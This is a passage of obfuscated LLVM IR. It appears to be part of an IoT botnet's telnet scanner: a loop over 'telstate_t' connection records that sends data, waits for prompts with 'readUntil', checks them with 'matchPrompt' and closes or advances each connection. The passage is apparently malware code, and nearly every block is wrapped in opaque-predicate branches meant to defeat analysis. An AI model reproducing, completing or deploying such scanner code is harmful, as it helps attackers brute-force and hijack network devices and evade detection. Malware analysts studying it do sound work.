  %1444 = sext i32 %1443 to i64
  %1445 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1444
  %1446 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1445, i32 0, i32 3
  store i8 1, i8* %1446, align 1
  br label %2839

; <label>:1447:                                   ; preds = %originalBBpart2148
  %1448 = load i32, i32* %10, align 4
  %1449 = sext i32 %1448 to i64
  %1450 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1449
  %1451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1450, i32 0, i32 0
  %1452 = load i32, i32* %1451, align 16
  %1453 = call i64 @send(i32 %1452, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.31, i32 0, i32 0), i64 2, i32 16384)
  %1454 = icmp slt i64 %1453, 0
  br i1 %1454, label %1455, label %1486

; <label>:1455:                                   ; preds = %1447
  %1456 = load i32, i32* @x.65
  %1457 = load i32, i32* @y.66
  %1458 = sub i32 %1456, 1
  %1459 = mul i32 %1456, %1458
  %1460 = urem i32 %1459, 2
  %1461 = icmp eq i32 %1460, 0
  %1462 = icmp slt i32 %1457, 10
  %1463 = or i1 %1461, %1462
  br i1 %1463, label %originalBB150, label %originalBB150alteredBB

originalBB150:                                    ; preds = %originalBB150alteredBB, %1455
  %1464 = load i32, i32* %10, align 4
  %1465 = sext i32 %1464 to i64
  %1466 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1465
  %1467 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1466, i32 0, i32 0
  %1468 = load i32, i32* %1467, align 16
  %1469 = call i32 @sclose(i32 %1468)
  %1470 = load i32, i32* %10, align 4
  %1471 = sext i32 %1470 to i64
  %1472 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1471
  %1473 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1472, i32 0, i32 2
  store i8 0, i8* %1473, align 8
  %1474 = load i32, i32* %10, align 4
  %1475 = sext i32 %1474 to i64
  %1476 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1475
  %1477 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1476, i32 0, i32 3
  store i8 1, i8* %1477, align 1
  %1478 = load i32, i32* @x.65
  %1479 = load i32, i32* @y.66
  %1480 = sub i32 %1478, 1
  %1481 = mul i32 %1478, %1480
  %1482 = urem i32 %1481, 2
  %1483 = icmp eq i32 %1482, 0
  %1484 = icmp slt i32 %1479, 10
  %1485 = or i1 %1483, %1484
  br i1 %1485, label %originalBBpart2152, label %originalBB150alteredBB

originalBBpart2152:                               ; preds = %originalBB150
  br label %2839

; <label>:1486:                                   ; preds = %1447
  %1487 = load i32, i32* %10, align 4
  %1488 = sext i32 %1487 to i64
  %1489 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1488
  %1490 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1489, i32 0, i32 2
  store i8 6, i8* %1490, align 8
  br label %2838

; <label>:1491:                                   ; preds = %116
  %1492 = load i32, i32* %10, align 4
  %1493 = sext i32 %1492 to i64
  %1494 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1493
  %1495 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1494, i32 0, i32 6
  %1496 = load i32, i32* %1495, align 4
  %1497 = icmp eq i32 %1496, 0
  br i1 %1497, label %1498, label %1504

; <label>:1498:                                   ; preds = %1491
  %1499 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %1500 = load i32, i32* %10, align 4
  %1501 = sext i32 %1500 to i64
  %1502 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1501
  %1503 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1502, i32 0, i32 6
  store i32 %1499, i32* %1503, align 4
  br label %1504

; <label>:1504:                                   ; preds = %1498, %1491
  %1505 = load i32, i32* %10, align 4
  %1506 = sext i32 %1505 to i64
  %1507 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1506
  %1508 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1507, i32 0, i32 0
  %1509 = load i32, i32* %1508, align 16
  %1510 = load i32, i32* %10, align 4
  %1511 = sext i32 %1510 to i64
  %1512 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1511
  %1513 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1512, i32 0, i32 8
  %1514 = load i8*, i8** %1513, align 8
  %1515 = load i32, i32* %10, align 4
  %1516 = sext i32 %1515 to i64
  %1517 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1516
  %1518 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1517, i32 0, i32 7
  %1519 = load i16, i16* %1518, align 16
  %1520 = zext i16 %1519 to i32
  %1521 = call i32 @readUntil(i32 %1509, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1514, i32 1024, i32 %1520)
  %1522 = icmp ne i32 %1521, 0
  br i1 %1522, label %1523, label %1646

; <label>:1523:                                   ; preds = %1504
  %1524 = load i32, i32* @x.65
  %1525 = load i32, i32* @y.66
  %1526 = sub i32 %1524, 1
  %1527 = mul i32 %1524, %1526
  %1528 = urem i32 %1527, 2
  %1529 = icmp eq i32 %1528, 0
  %1530 = icmp slt i32 %1525, 10
  %1531 = or i1 %1529, %1530
  br i1 %1531, label %originalBB154, label %originalBB154alteredBB

originalBB154:                                    ; preds = %originalBB154alteredBB, %1523
  %1532 = load i32, i32* %10, align 4
  %1533 = sext i32 %1532 to i64
  %1534 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1533
  %1535 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1534, i32 0, i32 6
  store i32 0, i32* %1535, align 4
  %1536 = load i32, i32* %10, align 4
  %1537 = sext i32 %1536 to i64
  %1538 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1537
  %1539 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1538, i32 0, i32 7
  store i16 0, i16* %1539, align 16
  %1540 = load i32, i32* %10, align 4
  %1541 = sext i32 %1540 to i64
  %1542 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1541
  %1543 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1542, i32 0, i32 8
  %1544 = load i8*, i8** %1543, align 8
  %1545 = call i8* @strstr(i8* %1544, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i32 0, i32 0)) #10
  %1546 = icmp ne i8* %1545, null
  %1547 = load i32, i32* @x.65
  %1548 = load i32, i32* @y.66
  %1549 = sub i32 %1547, 1
  %1550 = mul i32 %1547, %1549
  %1551 = urem i32 %1550, 2
  %1552 = icmp eq i32 %1551, 0
  %1553 = icmp slt i32 %1548, 10
  %1554 = or i1 %1552, %1553
  br i1 %1554, label %originalBBpart2156, label %originalBB154alteredBB

originalBBpart2156:                               ; preds = %originalBB154
  br i1 %1546, label %1555, label %1575

; <label>:1555:                                   ; preds = %originalBBpart2156
  %1556 = load i32, i32* %10, align 4
  %1557 = sext i32 %1556 to i64
  %1558 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1557
  %1559 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1558, i32 0, i32 8
  %1560 = load i8*, i8** %1559, align 8
  call void @llvm.memset.p0i8.i64(i8* %1560, i8 0, i64 1024, i32 1, i1 false)
  %1561 = load i32, i32* %10, align 4
  %1562 = sext i32 %1561 to i64
  %1563 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1562
  %1564 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1563, i32 0, i32 0
  %1565 = load i32, i32* %1564, align 16
  %1566 = call i32 @sclose(i32 %1565)
  %1567 = load i32, i32* %10, align 4
  %1568 = sext i32 %1567 to i64
  %1569 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1568
  %1570 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1569, i32 0, i32 2
  store i8 0, i8* %1570, align 8
  %1571 = load i32, i32* %10, align 4
  %1572 = sext i32 %1571 to i64
  %1573 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1572
  %1574 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1573, i32 0, i32 3
  store i8 0, i8* %1574, align 1
  br label %2839

; <label>:1575:                                   ; preds = %originalBBpart2156
  %1576 = load i32, i32* %10, align 4
  %1577 = sext i32 %1576 to i64
  %1578 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1577
  %1579 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1578, i32 0, i32 8
  %1580 = load i8*, i8** %1579, align 8
  %1581 = call i32 @matchPrompt(i8* %1580)
  %1582 = icmp ne i32 %1581, 0
  br i1 %1582, label %1603, label %1583

; <label>:1583:                                   ; preds = %1575
  %1584 = load i32, i32* %10, align 4
  %1585 = sext i32 %1584 to i64
  %1586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1585
  %1587 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1586, i32 0, i32 8
  %1588 = load i8*, i8** %1587, align 8
  call void @llvm.memset.p0i8.i64(i8* %1588, i8 0, i64 1024, i32 1, i1 false)
  %1589 = load i32, i32* %10, align 4
  %1590 = sext i32 %1589 to i64
  %1591 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1590
  %1592 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1591, i32 0, i32 0
  %1593 = load i32, i32* %1592, align 16
  %1594 = call i32 @sclose(i32 %1593)
  %1595 = load i32, i32* %10, align 4
  %1596 = sext i32 %1595 to i64
  %1597 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1596
  %1598 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1597, i32 0, i32 2
  store i8 0, i8* %1598, align 8
  %1599 = load i32, i32* %10, align 4
  %1600 = sext i32 %1599 to i64
  %1601 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1600
  %1602 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1601, i32 0, i32 3
  store i8 1, i8* %1602, align 1
  br label %2839

; <label>:1603:                                   ; preds = %1575
  %1604 = load i32, i32* @x.65
  %1605 = load i32, i32* @y.66
  %1606 = sub i32 %1604, 1
  %1607 = mul i32 %1604, %1606
  %1608 = urem i32 %1607, 2
  %1609 = icmp eq i32 %1608, 0
  %1610 = icmp slt i32 %1605, 10
  %1611 = or i1 %1609, %1610
  br i1 %1611, label %originalBB158, label %originalBB158alteredBB

originalBB158:                                    ; preds = %originalBB158alteredBB, %1603
  %1612 = load i32, i32* %10, align 4
  %1613 = sext i32 %1612 to i64
  %1614 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1613
  %1615 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1614, i32 0, i32 2
  store i8 7, i8* %1615, align 8
  %1616 = load i32, i32* @x.65
  %1617 = load i32, i32* @y.66
  %1618 = sub i32 %1616, 1
  %1619 = mul i32 %1616, %1618
  %1620 = urem i32 %1619, 2
  %1621 = icmp eq i32 %1620, 0
  %1622 = icmp slt i32 %1617, 10
  %1623 = or i1 %1621, %1622
  br i1 %1623, label %originalBBpart2160, label %originalBB158alteredBB

originalBBpart2160:                               ; preds = %originalBB158
  br label %1624

; <label>:1624:                                   ; preds = %originalBBpart2160
  %1625 = load i32, i32* @x.65
  %1626 = load i32, i32* @y.66
  %1627 = sub i32 %1625, 1
  %1628 = mul i32 %1625, %1627
  %1629 = urem i32 %1628, 2
  %1630 = icmp eq i32 %1629, 0
  %1631 = icmp slt i32 %1626, 10
  %1632 = or i1 %1630, %1631
  br i1 %1632, label %originalBB162, label %originalBB162alteredBB

originalBB162:                                    ; preds = %originalBB162alteredBB, %1624
  %1633 = load i32, i32* %10, align 4
  %1634 = sext i32 %1633 to i64
  %1635 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1634
  %1636 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1635, i32 0, i32 8
  %1637 = load i8*, i8** %1636, align 8
  call void @llvm.memset.p0i8.i64(i8* %1637, i8 0, i64 1024, i32 1, i1 false)
  %1638 = load i32, i32* @x.65
  %1639 = load i32, i32* @y.66
  %1640 = sub i32 %1638, 1
  %1641 = mul i32 %1638, %1640
  %1642 = urem i32 %1641, 2
  %1643 = icmp eq i32 %1642, 0
  %1644 = icmp slt i32 %1639, 10
  %1645 = or i1 %1643, %1644
  br i1 %1645, label %originalBBpart2164, label %originalBB162alteredBB

originalBBpart2164:                               ; preds = %originalBB162
  br label %2839

; <label>:1646:                                   ; preds = %1504
  %1647 = load i32, i32* %10, align 4
  %1648 = sext i32 %1647 to i64
  %1649 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1648
  %1650 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1649, i32 0, i32 0
  %1651 = load i32, i32* %1650, align 16
  %1652 = load i32, i32* %10, align 4
  %1653 = sext i32 %1652 to i64
  %1654 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1653
  %1655 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1654, i32 0, i32 8
  %1656 = load i8*, i8** %1655, align 8
  %1657 = load i32, i32* %10, align 4
  %1658 = sext i32 %1657 to i64
  %1659 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1658
  %1660 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1659, i32 0, i32 7
  %1661 = load i16, i16* %1660, align 16
  %1662 = zext i16 %1661 to i32
  %1663 = call i32 @readUntil(i32 %1651, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1656, i32 1024, i32 %1662)
  %1664 = icmp ne i32 %1663, 0
  br i1 %1664, label %1665, label %1772

; <label>:1665:                                   ; preds = %1646
  %1666 = load i32, i32* @x.65
  %1667 = load i32, i32* @y.66
  %1668 = sub i32 %1666, 1
  %1669 = mul i32 %1666, %1668
  %1670 = urem i32 %1669, 2
  %1671 = icmp eq i32 %1670, 0
  %1672 = icmp slt i32 %1667, 10
  %1673 = or i1 %1671, %1672
  br i1 %1673, label %originalBB166, label %originalBB166alteredBB

originalBB166:                                    ; preds = %originalBB166alteredBB, %1665
  %1674 = load i32, i32* %10, align 4
  %1675 = sext i32 %1674 to i64
  %1676 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1675
  %1677 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1676, i32 0, i32 6
  store i32 0, i32* %1677, align 4
  %1678 = load i32, i32* %10, align 4
  %1679 = sext i32 %1678 to i64
  %1680 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1679
  %1681 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1680, i32 0, i32 7
  store i16 0, i16* %1681, align 16
  %1682 = load i32, i32* %10, align 4
  %1683 = sext i32 %1682 to i64
  %1684 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1683
  %1685 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1684, i32 0, i32 8
  %1686 = load i8*, i8** %1685, align 8
  %1687 = call i8* @strstr(i8* %1686, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i32 0, i32 0)) #10
  %1688 = icmp ne i8* %1687, null
  %1689 = load i32, i32* @x.65
  %1690 = load i32, i32* @y.66
  %1691 = sub i32 %1689, 1
  %1692 = mul i32 %1689, %1691
  %1693 = urem i32 %1692, 2
  %1694 = icmp eq i32 %1693, 0
  %1695 = icmp slt i32 %1690, 10
  %1696 = or i1 %1694, %1695
  br i1 %1696, label %originalBBpart2168, label %originalBB166alteredBB

originalBBpart2168:                               ; preds = %originalBB166
  br i1 %1688, label %1697, label %1733

; <label>:1697:                                   ; preds = %originalBBpart2168
  %1698 = load i32, i32* @x.65
  %1699 = load i32, i32* @y.66
  %1700 = sub i32 %1698, 1
  %1701 = mul i32 %1698, %1700
  %1702 = urem i32 %1701, 2
  %1703 = icmp eq i32 %1702, 0
  %1704 = icmp slt i32 %1699, 10
  %1705 = or i1 %1703, %1704
  br i1 %1705, label %originalBB170, label %originalBB170alteredBB

originalBB170:                                    ; preds = %originalBB170alteredBB, %1697
  %1706 = load i32, i32* %10, align 4
  %1707 = sext i32 %1706 to i64
  %1708 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1707
  %1709 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1708, i32 0, i32 8
  %1710 = load i8*, i8** %1709, align 8
  call void @llvm.memset.p0i8.i64(i8* %1710, i8 0, i64 1024, i32 1, i1 false)
  %1711 = load i32, i32* %10, align 4
  %1712 = sext i32 %1711 to i64
  %1713 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1712
  %1714 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1713, i32 0, i32 0
  %1715 = load i32, i32* %1714, align 16
  %1716 = call i32 @sclose(i32 %1715)
  %1717 = load i32, i32* %10, align 4
  %1718 = sext i32 %1717 to i64
  %1719 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1718
  %1720 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1719, i32 0, i32 2
  store i8 0, i8* %1720, align 8
  %1721 = load i32, i32* %10, align 4
  %1722 = sext i32 %1721 to i64
  %1723 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1722
  %1724 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1723, i32 0, i32 3
  store i8 0, i8* %1724, align 1
  %1725 = load i32, i32* @x.65
  %1726 = load i32, i32* @y.66
  %1727 = sub i32 %1725, 1
  %1728 = mul i32 %1725, %1727
  %1729 = urem i32 %1728, 2
  %1730 = icmp eq i32 %1729, 0
  %1731 = icmp slt i32 %1726, 10
  %1732 = or i1 %1730, %1731
  br i1 %1732, label %originalBBpart2172, label %originalBB170alteredBB

originalBBpart2172:                               ; preds = %originalBB170
  br label %2839

; <label>:1733:                                   ; preds = %originalBBpart2168
  %1734 = load i32, i32* %10, align 4
  %1735 = sext i32 %1734 to i64
  %1736 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1735
  %1737 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1736, i32 0, i32 8
  %1738 = load i8*, i8** %1737, align 8
  %1739 = call i32 @matchPrompt(i8* %1738)
  %1740 = icmp ne i32 %1739, 0
  br i1 %1740, label %1761, label %1741

; <label>:1741:                                   ; preds = %1733
  %1742 = load i32, i32* %10, align 4
  %1743 = sext i32 %1742 to i64
  %1744 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1743
  %1745 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1744, i32 0, i32 8
  %1746 = load i8*, i8** %1745, align 8
  call void @llvm.memset.p0i8.i64(i8* %1746, i8 0, i64 1024, i32 1, i1 false)
  %1747 = load i32, i32* %10, align 4
  %1748 = sext i32 %1747 to i64
  %1749 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1748
  %1750 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1749, i32 0, i32 0
  %1751 = load i32, i32* %1750, align 16
  %1752 = call i32 @sclose(i32 %1751)
  %1753 = load i32, i32* %10, align 4
  %1754 = sext i32 %1753 to i64
  %1755 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1754
  %1756 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1755, i32 0, i32 2
  store i8 0, i8* %1756, align 8
  %1757 = load i32, i32* %10, align 4
  %1758 = sext i32 %1757 to i64
  %1759 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1758
  %1760 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1759, i32 0, i32 3
  store i8 1, i8* %1760, align 1
  br label %2839

; <label>:1761:                                   ; preds = %1733
  %1762 = load i32, i32* %10, align 4
  %1763 = sext i32 %1762 to i64
  %1764 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1763
  %1765 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1764, i32 0, i32 2
  store i8 7, i8* %1765, align 8
  br label %1766

; <label>:1766:                                   ; preds = %1761
  %1767 = load i32, i32* %10, align 4
  %1768 = sext i32 %1767 to i64
  %1769 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1768
  %1770 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1769, i32 0, i32 8
  %1771 = load i8*, i8** %1770, align 8
  call void @llvm.memset.p0i8.i64(i8* %1771, i8 0, i64 1024, i32 1, i1 false)
  br label %2839

; <label>:1772:                                   ; preds = %1646
  %1773 = load i32, i32* %10, align 4
  %1774 = sext i32 %1773 to i64
  %1775 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1774
  %1776 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1775, i32 0, i32 0
  %1777 = load i32, i32* %1776, align 16
  %1778 = load i32, i32* %10, align 4
  %1779 = sext i32 %1778 to i64
  %1780 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1779
  %1781 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1780, i32 0, i32 8
  %1782 = load i8*, i8** %1781, align 8
  %1783 = load i32, i32* %10, align 4
  %1784 = sext i32 %1783 to i64
  %1785 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1784
  %1786 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1785, i32 0, i32 7
  %1787 = load i16, i16* %1786, align 16
  %1788 = zext i16 %1787 to i32
  %1789 = call i32 @readUntil(i32 %1777, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1782, i32 1024, i32 %1788)
  %1790 = icmp ne i32 %1789, 0
  br i1 %1790, label %1791, label %1914

; <label>:1791:                                   ; preds = %1772
  %1792 = load i32, i32* @x.65
  %1793 = load i32, i32* @y.66
  %1794 = sub i32 %1792, 1
  %1795 = mul i32 %1792, %1794
  %1796 = urem i32 %1795, 2
  %1797 = icmp eq i32 %1796, 0
  %1798 = icmp slt i32 %1793, 10
  %1799 = or i1 %1797, %1798
  br i1 %1799, label %originalBB174, label %originalBB174alteredBB

originalBB174:                                    ; preds = %originalBB174alteredBB, %1791
  %1800 = load i32, i32* %10, align 4
  %1801 = sext i32 %1800 to i64
  %1802 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1801
  %1803 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1802, i32 0, i32 6
  store i32 0, i32* %1803, align 4
  %1804 = load i32, i32* %10, align 4
  %1805 = sext i32 %1804 to i64
  %1806 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1805
  %1807 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1806, i32 0, i32 7
  store i16 0, i16* %1807, align 16
  %1808 = load i32, i32* %10, align 4
  %1809 = sext i32 %1808 to i64
  %1810 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1809
  %1811 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1810, i32 0, i32 8
  %1812 = load i8*, i8** %1811, align 8
  %1813 = call i8* @strstr(i8* %1812, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i32 0, i32 0)) #10
  %1814 = icmp ne i8* %1813, null
  %1815 = load i32, i32* @x.65
  %1816 = load i32, i32* @y.66
  %1817 = sub i32 %1815, 1
  %1818 = mul i32 %1815, %1817
  %1819 = urem i32 %1818, 2
  %1820 = icmp eq i32 %1819, 0
  %1821 = icmp slt i32 %1816, 10
  %1822 = or i1 %1820, %1821
  br i1 %1822, label %originalBBpart2176, label %originalBB174alteredBB

originalBBpart2176:                               ; preds = %originalBB174
  br i1 %1814, label %1823, label %1859

; <label>:1823:                                   ; preds = %originalBBpart2176
  %1824 = load i32, i32* @x.65
  %1825 = load i32, i32* @y.66
  %1826 = sub i32 %1824, 1
  %1827 = mul i32 %1824, %1826
  %1828 = urem i32 %1827, 2
  %1829 = icmp eq i32 %1828, 0
  %1830 = icmp slt i32 %1825, 10
  %1831 = or i1 %1829, %1830
  br i1 %1831, label %originalBB178, label %originalBB178alteredBB

originalBB178:                                    ; preds = %originalBB178alteredBB, %1823
  %1832 = load i32, i32* %10, align 4
  %1833 = sext i32 %1832 to i64
  %1834 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1833
  %1835 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1834, i32 0, i32 8
  %1836 = load i8*, i8** %1835, align 8
  call void @llvm.memset.p0i8.i64(i8* %1836, i8 0, i64 1024, i32 1, i1 false)
  %1837 = load i32, i32* %10, align 4
  %1838 = sext i32 %1837 to i64
  %1839 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1838
  %1840 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1839, i32 0, i32 0
  %1841 = load i32, i32* %1840, align 16
  %1842 = call i32 @sclose(i32 %1841)
  %1843 = load i32, i32* %10, align 4
  %1844 = sext i32 %1843 to i64
  %1845 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1844
  %1846 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1845, i32 0, i32 2
  store i8 0, i8* %1846, align 8
  %1847 = load i32, i32* %10, align 4
  %1848 = sext i32 %1847 to i64
  %1849 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1848
  %1850 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1849, i32 0, i32 3
  store i8 0, i8* %1850, align 1
  %1851 = load i32, i32* @x.65
  %1852 = load i32, i32* @y.66
  %1853 = sub i32 %1851, 1
  %1854 = mul i32 %1851, %1853
  %1855 = urem i32 %1854, 2
  %1856 = icmp eq i32 %1855, 0
  %1857 = icmp slt i32 %1852, 10
  %1858 = or i1 %1856, %1857
  br i1 %1858, label %originalBBpart2180, label %originalBB178alteredBB

originalBBpart2180:                               ; preds = %originalBB178
  br label %2839

; <label>:1859:                                   ; preds = %originalBBpart2176
  %1860 = load i32, i32* %10, align 4
  %1861 = sext i32 %1860 to i64
  %1862 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1861
  %1863 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1862, i32 0, i32 8
  %1864 = load i8*, i8** %1863, align 8
  %1865 = call i32 @matchPrompt(i8* %1864)
  %1866 = icmp ne i32 %1865, 0
  br i1 %1866, label %1887, label %1867

; <label>:1867:                                   ; preds = %1859
  %1868 = load i32, i32* %10, align 4
  %1869 = sext i32 %1868 to i64
  %1870 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1869
  %1871 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1870, i32 0, i32 8
  %1872 = load i8*, i8** %1871, align 8
  call void @llvm.memset.p0i8.i64(i8* %1872, i8 0, i64 1024, i32 1, i1 false)
  %1873 = load i32, i32* %10, align 4
  %1874 = sext i32 %1873 to i64
  %1875 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1874
  %1876 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1875, i32 0, i32 0
  %1877 = load i32, i32* %1876, align 16
  %1878 = call i32 @sclose(i32 %1877)
  %1879 = load i32, i32* %10, align 4
  %1880 = sext i32 %1879 to i64
  %1881 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1880
  %1882 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1881, i32 0, i32 2
  store i8 0, i8* %1882, align 8
  %1883 = load i32, i32* %10, align 4
  %1884 = sext i32 %1883 to i64
  %1885 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1884
  %1886 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1885, i32 0, i32 3
  store i8 1, i8* %1886, align 1
  br label %2839

; <label>:1887:                                   ; preds = %1859
  %1888 = load i32, i32* @x.65
  %1889 = load i32, i32* @y.66
  %1890 = sub i32 %1888, 1
  %1891 = mul i32 %1888, %1890
  %1892 = urem i32 %1891, 2
  %1893 = icmp eq i32 %1892, 0
  %1894 = icmp slt i32 %1889, 10
  %1895 = or i1 %1893, %1894
  br i1 %1895, label %originalBB182, label %originalBB182alteredBB

originalBB182:                                    ; preds = %originalBB182alteredBB, %1887
  %1896 = load i32, i32* %10, align 4
  %1897 = sext i32 %1896 to i64
  %1898 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %48, i64 %1897
  %1899 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1898, i32 0, i32 2
  store i8 7, i8* %1899, align 8
  %1900 = load i32, i32* @x.65
  %1901 = load i32, i32* @y.66
  %1902 = sub i32 %1900, 1
  %1903 = mul i32 %1900, %1902
  %1904 = urem i32 %1903, 2
  %1905 = icmp eq i32 %1904, 0
  %1906 = icmp slt i32 %1901, 10
  %1907 = or i1 %1905, %1906
